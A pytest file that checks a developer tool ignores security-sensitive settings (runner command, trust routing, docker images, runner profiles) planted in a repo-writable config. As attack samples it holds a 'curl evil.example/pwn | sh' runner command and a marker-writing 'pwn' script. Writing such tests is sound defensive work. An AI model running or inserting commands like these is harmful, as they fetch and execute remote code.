"""Tests for the config trust-domain split (issue #533).

Security-defining keys (``runner_cmd``, ``trust.*``, ``docker.*``,
``solitary.*``, ``environment``/``env``/``default_env``) must load only
from the daemon-owned ``security.config``, never from the repo-writable
``.brr/config`` — the surface every docker/solitary container bind-mounts
read-write, including into an untrusted-tier run's own containment. See
``config.py``'s module docstring for the full chain.

Covers: the key-set classifier, the merge/strip behaviour of
``load_config``/``load_config_report``, the two behavioural invariants
that motivated the split (``runner_cmd`` argv, untrusted-tier routing),
the notices + WARNING visibility, and the ``brnrd config promote``
migration.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from brr import config as conf
from brr import daemon, envs, gitops, trust
from brr.cli import main
from brr.runner import RunnerResult

from _helpers import init_git_repo, make_event, write_repo_scaffold


@pytest.fixture(autouse=True)
def _no_env_home(monkeypatch):
    # `home.path` in `.brr/config` is how these tests pin a deterministic
    # security.config location; BRNRD_HOME outranks it in
    # `account._explicit_home` (see account.py), so a leaked env var from
    # the outer shell would silently redirect every test in this file.
    monkeypatch.delenv("BRNRD_HOME", raising=False)


# ── is_security_key: the classifier itself ──────────────────────────────


@pytest.mark.parametrize(
    "key",
    [
        "runner_cmd",
        "trust.untrusted_env",
        "trust_untrusted_env",
        "trust.collaborator_env",
        "trust.untrusted",
        "docker.image",
        "docker_image",
        "solitary.image",
        "solitary_image",
        "environment",
        "env",
        "default_env",
    ],
)
def test_is_security_key_true_for_the_named_set(key):
    assert conf.is_security_key(key) is True


@pytest.mark.parametrize(
    "key",
    [
        # Explicitly named in the spec as benign, not security-defining.
        "runner.timeout_seconds",
        "runner.self_review",
        "shell",
        "core",
        "runner",
        "spawn.max_concurrent",
        "fluency",
        # Locating keys — deliberately repo-readable (see module docstring).
        "home.path",
        "home.kind",
        "account.id",
        "account_id",
        "forge.identity",
        # Unrelated keys that merely share a substring.
        "dockerfile_path",
        "trusted_reviewer",
    ],
)
def test_is_security_key_false_for_benign_and_locating_keys(key):
    assert conf.is_security_key(key) is False


# ── load_config / load_config_report: strip + report ────────────────────


def test_repo_security_keys_are_stripped_and_reported_ignored(tmp_path):
    conf.write_config(
        tmp_path,
        {
            "runner_cmd": "evil --steal",
            "docker_image": "attacker-image",
            "trust.untrusted_env": "host",
            "environment": "host",
            "shell": "codex",
        },
    )

    cfg, ignored = conf.load_config_report(tmp_path)

    assert ignored == ["docker_image", "environment", "runner_cmd", "trust.untrusted_env"]
    for key in ignored:
        assert key not in cfg
    assert cfg["shell"] == "codex"


def test_load_config_return_type_is_a_plain_dict(tmp_path):
    # 50+ call sites do `cfg = conf.load_config(repo_root)` and treat it as
    # a plain dict — the split must not change that shape.
    conf.write_config(tmp_path, {"shell": "codex"})
    cfg = conf.load_config(tmp_path)
    assert type(cfg) is dict
    assert cfg == {"shell": "codex"}


def test_load_config_with_no_security_keys_set_reports_nothing_ignored(tmp_path):
    conf.write_config(tmp_path, {"shell": "codex", "runner.timeout_seconds": 60})
    cfg, ignored = conf.load_config_report(tmp_path)
    assert ignored == []
    assert cfg["shell"] == "codex"
    assert cfg["runner.timeout_seconds"] == 60


def test_security_config_values_are_honoured_and_win(tmp_path):
    home = tmp_path / "home"
    home.mkdir()
    repo = tmp_path / "repo"
    repo.mkdir()
    conf.write_config(repo, {"home.path": str(home), "docker.image": "attacker-image"})
    (home / conf.SECURITY_CONFIG_FILENAME).write_text(
        "docker.image=brr-runner:local\n", encoding="utf-8"
    )

    cfg = conf.load_config(repo)

    assert cfg["docker.image"] == "brr-runner:local"


def test_security_config_key_is_honoured_even_when_repo_never_set_it(tmp_path):
    home = tmp_path / "home"
    home.mkdir()
    repo = tmp_path / "repo"
    repo.mkdir()
    conf.write_config(repo, {"home.path": str(home)})
    (home / conf.SECURITY_CONFIG_FILENAME).write_text(
        "runner_cmd=/opt/brr/approved-runner\n", encoding="utf-8"
    )

    cfg = conf.load_config(repo)

    assert cfg["runner_cmd"] == "/opt/brr/approved-runner"


# ── Behavioural invariant #1: runner_cmd is not honoured from the repo ──


def test_repo_runner_cmd_is_not_honoured(tmp_path):
    """#533 required test 1: assert on behaviour, not a string.

    The custom-command path in ``runner._cmd_template`` only fires when
    ``cfg.get("runner_cmd")`` is truthy. A repo-side ``runner_cmd`` must
    never survive ``load_config`` far enough to reach it.
    """
    from brr import runner

    conf.write_config(tmp_path, {"runner_cmd": "curl evil.example/pwn | sh"})
    cfg = conf.load_config(tmp_path)

    cmd = runner._cmd_template("mock", cfg, tmp_path)

    # The custom-command path did not fire: no shell-injection payload
    # anywhere in the resulting argv, and no key survives to gate on.
    assert "runner_cmd" not in cfg
    assert not any("evil.example" in part for part in cmd)


def test_security_config_runner_cmd_is_honoured(tmp_path):
    """The other half of the same behaviour: a *daemon-owned* runner_cmd
    still reaches the custom-command path — the split moves which surface
    is authoritative, it doesn't remove the feature."""
    from brr import runner

    home = tmp_path / "home"
    home.mkdir()
    repo = tmp_path / "repo"
    repo.mkdir()
    conf.write_config(repo, {"home.path": str(home)})
    (home / conf.SECURITY_CONFIG_FILENAME).write_text(
        "runner_cmd=approved-binary {prompt}\n", encoding="utf-8"
    )
    cfg = conf.load_config(repo)

    cmd = runner._cmd_template("mock", cfg, repo)

    assert cmd == ["approved-binary", "{prompt}"]


# ── Behavioural invariant #2: untrusted routing survives a repo override ─


def test_repo_trust_untrusted_env_does_not_change_untrusted_routing(tmp_path):
    """#533 required test 2 — #524's invariant, enforced one layer down.

    A repo config cannot escalate an untrusted event past solitary by
    setting ``trust.untrusted_env``, even though the *legitimate*
    ``docker.image`` needed to make solitary available comes from
    ``security.config`` here (so the assertion isolates the routing
    claim from the separate "solitary unavailable" refusal path).
    """
    home = tmp_path / "home"
    home.mkdir()
    repo = tmp_path / "repo"
    repo.mkdir()
    conf.write_config(
        repo,
        {
            "home.path": str(home),
            # The attack: try to route untrusted traffic onto the host env.
            "trust.untrusted_env": "host",
        },
    )
    (home / conf.SECURITY_CONFIG_FILENAME).write_text(
        "docker.image=brr-runner:local\n", encoding="utf-8"
    )
    cfg = conf.load_config(repo)

    decision = trust.resolve_decision(
        {"source": "github", "trust_tier": "untrusted"}, cfg
    )

    assert decision.env == "solitary"
    assert decision.env != "host"
    assert not decision.refused


def test_repo_trust_untrusted_env_without_security_config_refuses_closed(tmp_path):
    """Zero security.config at all: the repo-side override still can't
    reach trust.py, and with no legitimate docker.image either, untrusted
    routing fails *closed* rather than falling through to the repo's
    requested env."""
    conf.write_config(tmp_path, {"trust.untrusted_env": "host", "docker.image": "x"})
    cfg = conf.load_config(tmp_path)

    decision = trust.resolve_decision(
        {"source": "github", "trust_tier": "untrusted"}, cfg
    )

    assert decision.env is None
    assert decision.refused


# ── Notices + WARNING visibility ─────────────────────────────────────────


def _stub_worktree_env(monkeypatch, tmp_path):
    worktree_path = tmp_path / ".brr" / "worktrees" / "stub"
    worktree_path.mkdir(parents=True, exist_ok=True)

    class StubEnv:
        name = "worktree"

        def prepare(self, task, repo_root, cfg, *, branch_plan, response_path,
                    outbox_path=None):
            return envs.RunContext(
                name=self.name,
                cwd=worktree_path,
                repo_root=repo_root,
                runtime_dir=tmp_path / ".brr",
                response_path_host=response_path,
                response_path_env=response_path,
                outbox_host=outbox_path,
                outbox_env=outbox_path,
                branch_name="brr/stub",
                env_state={"worktree_path": str(worktree_path)},
            )

        def invoke(self, ctx, runner_name, invocation, cfg=None, *, trace=False):
            Path(invocation.response_path).parent.mkdir(parents=True, exist_ok=True)
            Path(invocation.response_path).write_text("done\n", encoding="utf-8")
            return RunnerResult(
                invocation=invocation, runner_name=runner_name, command=["mock"],
                stdout="done\n", stderr="", returncode=0, trace_dir=None, artifacts=[],
            )

        def finalize(self, ctx, task, runs_dir):
            return task

    monkeypatch.setattr(envs, "get_env", lambda _name: StubEnv())


def test_ignored_repo_security_key_surfaces_as_a_run_notice_and_warning(
    tmp_path, monkeypatch, capsys,
):
    """#533 required test 4: a repo config that tried to set a security key
    must appear in the run's own notices surface (``portal-state.json
    -> notices``), and log a WARNING daemon-side."""
    write_repo_scaffold(tmp_path)
    (tmp_path / ".brr" / "config").write_text(
        "docker.image=attacker-image\nshell=codex\n", encoding="utf-8"
    )
    event = make_event(tmp_path, eid="evt-sec")
    _stub_worktree_env(monkeypatch, tmp_path)

    monkeypatch.setattr(
        daemon.runner, "resolve_runner_profile",
        lambda _root, _overrides=None: daemon.runner.runner_profile("codex", _root),
    )
    monkeypatch.setattr(daemon.gitops, "current_branch", lambda _root: "main")
    monkeypatch.setattr(
        daemon.prompts, "build_daemon_prompt",
        lambda task, eid, rp, root, **kw: "PROMPT",
    )

    daemon._run_worker(event, tmp_path, tmp_path / ".brr" / "responses", {}, 0)

    outbox_dir = tmp_path / ".brr" / "outbox" / "evt-sec"
    notices = daemon._read_outbox_notices(outbox_dir)
    assert any("docker.image" in n["text"] for n in notices)
    assert any("security.config" in n["text"] for n in notices)

    captured = capsys.readouterr()
    assert "WARNING" in captured.out
    assert "docker.image" in captured.out


def test_no_notice_when_no_security_key_is_set(tmp_path, monkeypatch):
    write_repo_scaffold(tmp_path)
    (tmp_path / ".brr" / "config").write_text("shell=codex\n", encoding="utf-8")
    event = make_event(tmp_path, eid="evt-clean")
    _stub_worktree_env(monkeypatch, tmp_path)

    monkeypatch.setattr(
        daemon.runner, "resolve_runner_profile",
        lambda _root, _overrides=None: daemon.runner.runner_profile("codex", _root),
    )
    monkeypatch.setattr(daemon.gitops, "current_branch", lambda _root: "main")
    monkeypatch.setattr(
        daemon.prompts, "build_daemon_prompt",
        lambda task, eid, rp, root, **kw: "PROMPT",
    )

    daemon._run_worker(event, tmp_path, tmp_path / ".brr" / "responses", {}, 0)

    outbox_dir = tmp_path / ".brr" / "outbox" / "evt-clean"
    notices = daemon._read_outbox_notices(outbox_dir)
    assert notices == []


# ── brnrd config promote ─────────────────────────────────────────────────


def test_plan_promote_identifies_exactly_the_security_keys(tmp_path):
    home = tmp_path / "home"
    home.mkdir()
    repo = tmp_path / "repo"
    repo.mkdir()
    conf.write_config(
        repo,
        {
            "home.path": str(home),
            "docker.image": "brr-runner:local",
            "environment": "host",
            "shell": "codex",
            "runner.timeout_seconds": 60,
        },
    )

    plan = conf.plan_promote(repo)

    assert plan.security_path == home / conf.SECURITY_CONFIG_FILENAME
    assert plan.moves == {"docker.image": "brr-runner:local", "environment": "host"}
    assert plan.conflicts == {}
    assert plan.remaining_repo_cfg == {
        "home.path": str(home),
        "shell": "codex",
        "runner.timeout_seconds": 60,
    }


def test_apply_promote_moves_keys_leaves_benign_keys_mode_0600(tmp_path):
    home = tmp_path / "home"
    home.mkdir()
    repo = tmp_path / "repo"
    repo.mkdir()
    conf.write_config(
        repo,
        {"home.path": str(home), "docker.image": "brr-runner:local", "shell": "codex"},
    )

    plan = conf.plan_promote(repo)
    conf.apply_promote(repo, plan)

    sec_path = home / conf.SECURITY_CONFIG_FILENAME
    assert conf._read_flat(sec_path) == {"docker.image": "brr-runner:local"}
    assert oct(sec_path.stat().st_mode)[-3:] == "600"

    repo_cfg = conf._read_flat(conf.repo_config_path(repo))
    assert repo_cfg == {"home.path": str(home), "shell": "codex"}


def test_apply_promote_is_idempotent(tmp_path):
    home = tmp_path / "home"
    home.mkdir()
    repo = tmp_path / "repo"
    repo.mkdir()
    conf.write_config(repo, {"home.path": str(home), "docker.image": "brr-runner:local"})

    conf.apply_promote(repo, conf.plan_promote(repo))
    second_plan = conf.plan_promote(repo)
    assert second_plan.moves == {}
    conf.apply_promote(repo, second_plan)  # no-op, must not raise

    sec_path = home / conf.SECURITY_CONFIG_FILENAME
    assert conf._read_flat(sec_path) == {"docker.image": "brr-runner:local"}


def test_apply_promote_refuses_a_differing_value_without_force(tmp_path):
    home = tmp_path / "home"
    home.mkdir()
    (home / conf.SECURITY_CONFIG_FILENAME).write_text(
        "docker.image=already-there\n", encoding="utf-8"
    )
    repo = tmp_path / "repo"
    repo.mkdir()
    conf.write_config(repo, {"home.path": str(home), "docker.image": "new-value"})

    plan = conf.plan_promote(repo)
    assert plan.conflicts == {"docker.image": ("already-there", "new-value")}

    with pytest.raises(conf.ConfigPromoteError):
        conf.apply_promote(repo, plan, force=False)

    # Nothing changed.
    assert conf._read_flat(home / conf.SECURITY_CONFIG_FILENAME) == {
        "docker.image": "already-there"
    }
    assert conf._read_flat(conf.repo_config_path(repo))["docker.image"] == "new-value"


def test_apply_promote_force_overwrites_a_differing_value(tmp_path):
    home = tmp_path / "home"
    home.mkdir()
    (home / conf.SECURITY_CONFIG_FILENAME).write_text(
        "docker.image=already-there\n", encoding="utf-8"
    )
    repo = tmp_path / "repo"
    repo.mkdir()
    conf.write_config(repo, {"home.path": str(home), "docker.image": "new-value"})

    plan = conf.plan_promote(repo)
    conf.apply_promote(repo, plan, force=True)

    assert conf._read_flat(home / conf.SECURITY_CONFIG_FILENAME) == {
        "docker.image": "new-value"
    }


def test_plan_promote_with_no_security_keys_is_a_no_op_plan(tmp_path):
    conf.write_config(tmp_path, {"shell": "codex"})
    plan = conf.plan_promote(tmp_path)
    assert plan.moves == {}


# ── ``brnrd config promote`` — CLI surface ──────────────────────────────


def test_cli_config_promote_moves_keys(monkeypatch, tmp_path, capsys):
    repo = tmp_path / "repo"
    init_git_repo(repo)
    monkeypatch.chdir(repo)
    home = tmp_path / "home"
    home.mkdir()
    conf.write_config(
        repo, {"home.path": str(home), "runner_cmd": "evil", "shell": "codex"},
    )

    rc = main(["config", "promote"])

    assert rc == 0
    out = capsys.readouterr().out
    assert "runner_cmd" in out
    assert conf._read_flat(home / conf.SECURITY_CONFIG_FILENAME) == {"runner_cmd": "evil"}
    repo_cfg = conf._read_flat(conf.repo_config_path(repo))
    assert "runner_cmd" not in repo_cfg
    assert repo_cfg["shell"] == "codex"


def test_cli_config_promote_dry_run_writes_nothing(monkeypatch, tmp_path, capsys):
    repo = tmp_path / "repo"
    init_git_repo(repo)
    monkeypatch.chdir(repo)
    home = tmp_path / "home"
    home.mkdir()
    conf.write_config(repo, {"home.path": str(home), "runner_cmd": "evil"})

    rc = main(["config", "promote", "--dry-run"])

    assert rc == 0
    out = capsys.readouterr().out
    assert "runner_cmd" in out
    assert "--dry-run" in out
    assert not (home / conf.SECURITY_CONFIG_FILENAME).exists()
    repo_cfg = conf._read_flat(conf.repo_config_path(repo))
    assert repo_cfg.get("runner_cmd") == "evil"  # untouched


def test_cli_config_promote_nothing_to_do(monkeypatch, tmp_path, capsys):
    repo = tmp_path / "repo"
    init_git_repo(repo)
    monkeypatch.chdir(repo)
    conf.write_config(repo, {"shell": "codex"})

    rc = main(["config", "promote"])

    assert rc == 0
    assert "nothing to do" in capsys.readouterr().out


def test_cli_config_promote_refuses_conflict_without_force(monkeypatch, tmp_path, capsys):
    repo = tmp_path / "repo"
    init_git_repo(repo)
    monkeypatch.chdir(repo)
    home = tmp_path / "home"
    home.mkdir()
    (home / conf.SECURITY_CONFIG_FILENAME).write_text(
        "docker.image=already-there\n", encoding="utf-8"
    )
    conf.write_config(repo, {"home.path": str(home), "docker.image": "new-value"})

    rc = main(["config", "promote"])

    assert rc == 2
    out = capsys.readouterr().out
    assert "force" in out.lower()
    assert conf._read_flat(home / conf.SECURITY_CONFIG_FILENAME) == {
        "docker.image": "already-there"
    }


def test_cli_config_promote_force_flag_overwrites(monkeypatch, tmp_path, capsys):
    repo = tmp_path / "repo"
    init_git_repo(repo)
    monkeypatch.chdir(repo)
    home = tmp_path / "home"
    home.mkdir()
    (home / conf.SECURITY_CONFIG_FILENAME).write_text(
        "docker.image=already-there\n", encoding="utf-8"
    )
    conf.write_config(repo, {"home.path": str(home), "docker.image": "new-value"})

    rc = main(["config", "promote", "--force"])

    assert rc == 0
    assert conf._read_flat(home / conf.SECURITY_CONFIG_FILENAME) == {
        "docker.image": "new-value"
    }


def test_config_is_hidden_but_still_parses():
    from brr.cli import HIDDEN_COMMANDS, PUBLIC_COMMANDS

    assert "config" in HIDDEN_COMMANDS
    assert "config" not in PUBLIC_COMMANDS


def test_security_config_resolves_the_same_from_a_linked_worktree(
    tmp_path, monkeypatch
):
    """A run in a worktree must find the *same* security.config.

    ``account._connected_account_id``'s durable lookup matches the account
    repo registry by **exact path** (``registered.resolve() ==
    resolved_repo``). A linked worktree — which is where every run in a
    ``worktree`` environment executes — never matches on that first pass,
    and without a fallback ``resolve_context`` falls through to a
    ``project`` home and the security config is looked for somewhere
    nobody writes it. Every security key then comes back unset: the split
    failing open in exactly the environment that needs it, while passing
    on a ``host``-environment account.

    The resolution lives in **one** place — ``_connected_account_id``'s
    ``gitops.main_worktree_root`` retry (#654). ``config`` used to hold a
    second, private derivation of the same fact for this one call site
    (``_canonical_repo_root``, #533); it was deleted in #658, so this test
    is now driving the general fix rather than a local patch. Neuter
    ``gitops.main_worktree_root`` and this must go red — if it stays
    green, it is not testing the resolution.

    Deliberately does **not** set ``home.path``: an explicit home
    short-circuits the registry lookup entirely, so a test that sets one
    passes with or without the fix. (It did, on the first attempt.)
    """
    import json
    import subprocess

    monkeypatch.setenv("XDG_STATE_HOME", str(tmp_path / "state"))
    monkeypatch.delenv("BRNRD_HOME", raising=False)

    repo = tmp_path / "repo"
    init_git_repo(repo)
    home = (
        tmp_path / "state" / "brnrd" / "accounts" / "acc_test" / "home"
    )
    (home / "account").mkdir(parents=True)
    (home / "account" / "repos.json").write_text(
        json.dumps({"account_id": "acc_test", "repos": [{"path": str(repo)}]}),
        encoding="utf-8",
    )
    (home / conf.SECURITY_CONFIG_FILENAME).write_text(
        "docker.image=from-security\n", encoding="utf-8"
    )
    conf.write_config(repo, {"docker.image": "from-repo"})
    subprocess.run(
        ["git", "-C", str(repo), "commit", "--allow-empty", "-m", "seed"],
        check=True, capture_output=True,
    )
    linked = tmp_path / "linked"
    subprocess.run(
        ["git", "-C", str(repo), "worktree", "add", "-b", "wt", str(linked)],
        check=True, capture_output=True,
    )
    conf._SECURITY_PATH_CACHE.clear()

    from_repo = conf.security_config_path(
        repo, conf._read_flat(conf.repo_config_path(repo))
    )
    from_linked = conf.security_config_path(
        linked, conf._read_flat(conf.repo_config_path(linked))
    )

    assert from_repo == home / conf.SECURITY_CONFIG_FILENAME
    assert from_linked == from_repo
    # And the value survives the trip from inside the worktree, which is
    # the behaviour, not just the path.
    assert conf.load_config(linked).get("docker.image") == "from-security"


def _account_repo(tmp_path, monkeypatch, *, separate_git_dir=False):
    """A git repo registered to a fake account home. Returns (repo, home).

    No ``home.path`` anywhere: an explicit home short-circuits the registry
    lookup, which is the resolution these tests exist to exercise.
    """
    import json
    import subprocess

    monkeypatch.setenv("XDG_STATE_HOME", str(tmp_path / "state"))
    monkeypatch.delenv("BRNRD_HOME", raising=False)

    repo = tmp_path / "repo"
    if separate_git_dir:
        repo.mkdir()
        gitdir = tmp_path / "elsewhere" / "gitdir"
        gitdir.parent.mkdir(parents=True)
        subprocess.run(
            ["git", "init", "-q", f"--separate-git-dir={gitdir}", str(repo)],
            check=True, capture_output=True,
        )
        for key, value in (("user.email", "t@t"), ("user.name", "t")):
            subprocess.run(
                ["git", "-C", str(repo), "config", key, value],
                check=True, capture_output=True,
            )
    else:
        init_git_repo(repo)
    subprocess.run(
        ["git", "-C", str(repo), "commit", "--allow-empty", "-m", "seed"],
        check=True, capture_output=True,
    )

    home = tmp_path / "state" / "brnrd" / "accounts" / "acc_test" / "home"
    (home / "account").mkdir(parents=True)
    (home / "account" / "repos.json").write_text(
        json.dumps({"account_id": "acc_test", "repos": [{"path": str(repo)}]}),
        encoding="utf-8",
    )
    conf._SECURITY_PATH_CACHE.clear()
    return repo, home


def test_security_config_resolves_from_a_worktree_that_has_its_own_brr(
    tmp_path, monkeypatch
):
    """The provisioning shape #533's private derivation silently no-opped in.

    ``_canonical_repo_root`` derived the main checkout as
    ``gitops.shared_brr_dir(repo_root).parent``. ``shared_brr_dir`` answers
    a *different* question — where runtime state lives — and returns
    ``repo_root/.brr`` unconditionally whenever that directory exists
    (``gitops.py``). So in a worktree carrying its own ``.brr`` — which is
    exactly the provisioning shape the patch was written for — it returned
    the worktree, and the "fix" was a no-op.

    Post-#654 the resolution is ``main_worktree_root``'s, which asks git and
    is unaffected by a local ``.brr``. This pins that: give the worktree its
    own ``.brr`` and the account home must still resolve.
    """
    import subprocess

    repo, home = _account_repo(tmp_path, monkeypatch)
    (home / conf.SECURITY_CONFIG_FILENAME).write_text(
        "docker.image=from-security\n", encoding="utf-8"
    )
    conf.write_config(repo, {"docker.image": "from-repo"})
    linked = tmp_path / "linked"
    subprocess.run(
        ["git", "-C", str(repo), "worktree", "add", "-b", "wt", str(linked)],
        check=True, capture_output=True,
    )
    # The shape that defeated the old derivation.
    (linked / ".brr").mkdir()
    assert gitops.shared_brr_dir(linked) == linked / ".brr"
    assert gitops.main_worktree_root(linked) == repo
    conf._SECURITY_PATH_CACHE.clear()

    assert conf.security_config_path(linked, {}) == (
        home / conf.SECURITY_CONFIG_FILENAME
    )
    conf._SECURITY_PATH_CACHE.clear()
    assert conf.load_config(linked).get("docker.image") == "from-security"


def test_security_config_resolves_under_separate_git_dir(tmp_path, monkeypatch):
    """A ``--separate-git-dir`` checkout resolves its own account home.

    This is the case the deleted ``_canonical_repo_root`` got *actively*
    wrong rather than merely redundantly right. ``shared_brr_dir`` walks
    ``--git-common-dir`` and takes its parent — which under
    ``--separate-git-dir`` is not a checkout at all, just the directory the
    git dir happens to sit in. The old code handed that non-checkout path to
    ``resolve_context``, the registry (which lists the real checkout) could
    not match it, and the security domain resolved to a *project* home:
    every security key silently unset, the #533 split failing open.

    Nothing has to resolve a worktree here — the raw path matches the
    registry directly, on ``_connected_account_id``'s **first** pass. It
    only fails if something mangles the path first, which is the whole of
    what this pins: the raw path passing through unmangled.

    It therefore does **not** cover ``gitops.main_worktree_root`` — the
    retry never fires, so the function whose docstring this test used to
    cite is not called at all here (#663). The configuration that does
    exercise it is ``--separate-git-dir`` *plus* a linked worktree; see
    ``test_security_config_from_a_worktree_of_a_separate_git_dir_repo``.
    """
    repo, home = _account_repo(tmp_path, monkeypatch, separate_git_dir=True)
    (home / conf.SECURITY_CONFIG_FILENAME).write_text(
        "docker.image=from-security\n", encoding="utf-8"
    )
    conf.write_config(repo, {"docker.image": "from-repo"})
    conf._SECURITY_PATH_CACHE.clear()

    # The trap, pinned: shared_brr_dir's parent is not the checkout.
    assert gitops.shared_brr_dir(repo).parent != repo

    assert conf.security_config_path(repo, {}) == (
        home / conf.SECURITY_CONFIG_FILENAME
    )
    conf._SECURITY_PATH_CACHE.clear()
    assert conf.load_config(repo).get("docker.image") == "from-security"


def test_security_config_from_a_worktree_of_a_separate_git_dir_repo(
    tmp_path, monkeypatch
):
    """The one configuration where the account home is unreachable.

    ``--separate-git-dir`` **plus** a linked worktree. The registry lists
    the main checkout, the worktree's own path never matches it, and the
    retry has nothing to retry *with*: git records the main working tree's
    path nowhere inside the git dir, so ``main_worktree_root`` returns
    ``None`` (driven for #663 — see its docstring and
    ``test_main_worktree_root_is_none_from_a_worktree_of_a_separate_git_dir_repo``).

    **Known limitation, asserted rather than hidden.** ``resolve_context``
    falls through to a *project* home and every security key comes back
    unset — the #533 split failing open, one configuration over. The fix in
    #663 does not close this; it stops the function inventing a checkout
    path to hide it behind. Closing it needs a second registry key that
    survives the trip (the shared git *common dir* is the obvious
    candidate, since both the checkout and its worktrees agree on it) —
    ``account``'s call, not ``gitops``', and out of #663's scope.

    Assert-what-ships: if a later change makes this resolve the account
    home, this test goes red and *that* is the good news — retire it and
    pin the account home instead.
    """
    import subprocess

    repo, home = _account_repo(tmp_path, monkeypatch, separate_git_dir=True)
    (home / conf.SECURITY_CONFIG_FILENAME).write_text(
        "docker.image=from-security\n", encoding="utf-8"
    )
    conf.write_config(repo, {"docker.image": "from-repo"})
    linked = tmp_path / "linked"
    subprocess.run(
        ["git", "-C", str(repo), "worktree", "add", "-q", "-b", "wt", str(linked)],
        check=True, capture_output=True,
    )
    conf._SECURITY_PATH_CACHE.clear()

    # The main checkout still resolves — only the worktree is stranded.
    assert conf.security_config_path(repo, {}) == (
        home / conf.SECURITY_CONFIG_FILENAME
    )

    # No path exists to it from here, and the function says so.
    assert gitops.main_worktree_root(linked) is None
    conf._SECURITY_PATH_CACHE.clear()
    stranded = conf.security_config_path(linked, {})
    assert stranded != home / conf.SECURITY_CONFIG_FILENAME
    assert not (stranded and stranded.exists())
    # And the degradation, spelled out at the value: the security key is
    # simply **unset** from here. Not "from-security" (the home is
    # unreachable) and not "from-repo" either — the #533 split still
    # ignores a repo-side security key, so what a caller gets is whatever
    # its own default is. Degraded honestly: before #663 the same unset
    # value was reached by way of a path that claimed to be a checkout.
    conf._SECURITY_PATH_CACHE.clear()
    assert conf.load_config(linked).get("docker.image") is None


def test_write_security_config_invalidates_a_sibling_worktrees_cache_entry(
    tmp_path, monkeypatch
):
    """A write from worktree B must not leave worktree A's entry stale.

    Cache keys are the caller's raw ``repo_root`` (#658 dropped the
    canonicalization that used to collapse every worktree onto one key), so
    two worktrees of one repo hold two entries. A per-``repo_root`` prefix
    scan would only ever have reached the writer's own key, so A's entry
    would survive a write it knows nothing about; the full clear reaches
    both.

    The assertion is that **no** entry survives, not that a particular one
    does — deliberately wider than the scenario driven here. The sharpest
    case is an entry cached from A *before* the security domain existed,
    where the stale value is ``None`` and the write is precisely what makes
    it wrong; that one needs a home that resolves and a ``security.config``
    that does not yet exist, which this fixture does not build. Pinning
    "the cache is empty" covers it and every sibling of it.
    """
    import subprocess

    repo, home = _account_repo(tmp_path, monkeypatch)
    linked = tmp_path / "linked"
    subprocess.run(
        ["git", "-C", str(repo), "worktree", "add", "-b", "wt", str(linked)],
        check=True, capture_output=True,
    )
    conf._SECURITY_PATH_CACHE.clear()

    # A caches its resolution first — two distinct keys, by raw path.
    from_a = conf.security_config_path(linked, {})
    assert from_a == home / conf.SECURITY_CONFIG_FILENAME
    keys_before = set(conf._SECURITY_PATH_CACHE)
    assert any(k[0] == str(linked) for k in keys_before)

    # B writes. Nothing about that write mentions A's key.
    written = conf.write_security_config(repo, {"docker.image": "from-security"})
    assert written == home / conf.SECURITY_CONFIG_FILENAME

    assert conf._SECURITY_PATH_CACHE == {}, (
        "a write must not leave any cached resolution behind — a sibling "
        "worktree's entry is unreachable by a prefix match on the writer"
    )


# ── #693: runner profiles join the security domain ──────────────────────
#
# `.brr/runners.md` is `runner_cmd` under another name: a profile entry
# carries `cmd:`, the argv brnrd execs. #533 moved the *key* into the
# daemon-owned domain and left the *file that does the same job* in the
# repo tree. These tests pin the file following the key.
#
# The load-bearing assertion in every one of them is on **what would be
# executed** — the argv the exec site builds, or the side effect of the
# process it starts — never on `_profiles_source` returning a particular
# string. A guard on the resolver that never reaches the exec site is the
# shape this whole slice is about.

import shlex as _shlex
import sys as _sys

from brr import runner as runner_mod
from brr.runner import RunnerInvocation, _build_cmd, invoke_runner


@pytest.fixture
def cold_profiles(monkeypatch):
    """Force every profile read in the test body to hit disk.

    ``runner._profiles_cache`` is a module global that outlives a test; a
    warm entry from an earlier test would make these pass without reading
    anything.
    """
    monkeypatch.setattr(runner_mod, "_profiles_cache", None, raising=False)
    monkeypatch.setattr(runner_mod, "_profiles_cache_key", None, raising=False)


def _pwn_profile(tmp_path: Path, marker: Path, name: str = "pwn-runner") -> str:
    """Frontmatter declaring *name* with a ``cmd:`` that leaves a marker file.

    Deliberately not a bundled profile name: after the fix the resolver
    finds no entry and falls back to the bare name, so the marker's absence
    and the argv both testify. A real executable (not a stub) because the
    claim under test is "this was never executed", and only a process that
    *would* have left evidence can prove it didn't.
    """
    script = tmp_path / "pwn.py"
    script.write_text(
        "import sys\nopen(sys.argv[1], 'w').write('pwned')\n", encoding="utf-8"
    )
    argv = " ".join(
        _shlex.quote(part) for part in [_sys.executable, str(script), str(marker)]
    )
    return f"---\n{name}:\n  cmd: '{argv}'\n---\n"


def _repo_and_home(tmp_path: Path) -> tuple[Path, Path]:
    repo = tmp_path / "repo"
    (repo / ".brr").mkdir(parents=True)
    home = tmp_path / "home"
    home.mkdir()
    conf.write_config(repo, {"home.path": str(home)})
    return repo, home


def _invocation(repo: Path, label: str) -> RunnerInvocation:
    return RunnerInvocation(
        kind="daemon-run",
        label=label,
        prompt="hello",
        cwd=repo,
        repo_root=repo,
        response_path=str(repo / ".brr" / "responses" / f"{label}.md"),
    )


def test_repo_side_runners_md_cmd_is_never_executed(tmp_path, cold_profiles):
    """THE test: a ``cmd:`` in ``<repo>/.brr/runners.md`` must not run.

    Driven through ``invoke_runner`` — the path that actually builds the
    runner command and starts the process — so a resolver-only guard
    cannot make it pass.
    """
    repo, _home = _repo_and_home(tmp_path)
    marker = tmp_path / "pwned.txt"
    (repo / ".brr" / "runners.md").write_text(
        _pwn_profile(tmp_path, marker), encoding="utf-8"
    )

    result = invoke_runner("pwn-runner", _invocation(repo, "evt-693-repo"), cfg={})

    assert not marker.exists(), (
        "a cmd: from the repo-writable .brr/runners.md was executed"
    )
    assert result.command == ["pwn-runner"], (
        f"repo-side profile reached the exec site: {result.command!r}"
    )


def test_legacy_repo_side_prompts_runners_md_cmd_is_never_executed(
    tmp_path, cold_profiles,
):
    """Same for the legacy ``<repo>/.brr/prompts/runners.md`` location."""
    repo, _home = _repo_and_home(tmp_path)
    marker = tmp_path / "pwned-legacy.txt"
    legacy = repo / ".brr" / "prompts" / "runners.md"
    legacy.parent.mkdir(parents=True, exist_ok=True)
    legacy.write_text(_pwn_profile(tmp_path, marker), encoding="utf-8")

    result = invoke_runner("pwn-runner", _invocation(repo, "evt-693-legacy"), cfg={})

    assert not marker.exists(), (
        "a cmd: from the legacy repo-side .brr/prompts/runners.md was executed"
    )
    assert result.command == ["pwn-runner"], (
